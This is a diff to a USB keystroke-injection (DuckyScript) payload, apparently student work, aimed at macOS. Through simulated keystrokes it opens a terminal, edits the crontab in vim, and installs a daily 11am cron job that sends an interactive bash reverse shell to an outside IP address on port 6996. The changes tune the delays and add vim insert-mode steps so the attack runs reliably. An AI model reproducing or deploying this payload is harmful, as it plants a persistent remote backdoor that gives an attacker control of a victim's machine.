@@ -3,7 +3,7 @@ REM Shrey Somaiya z5257343
 REM 2 April 2020
 REM Set default delay 200ms
 
-DEFAULT_DELAY 200
+DEFAULT_DELAY 2000
 
 
 REM Command + Space ==> spotlight search
@@ -36,9 +36,16 @@ ENTER
 STRING $
 ENTER
 
+REM start insert mode
+STRING i
+ENTER
+
 REM set the reverse shell to occur 11am every day
 STRING 0 11 * * * /bin/sh -c "/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &\" && exit
 ENTER
+
+REM exit insert mode
+ESC
 
 REM Exit vim
 STRING :wq
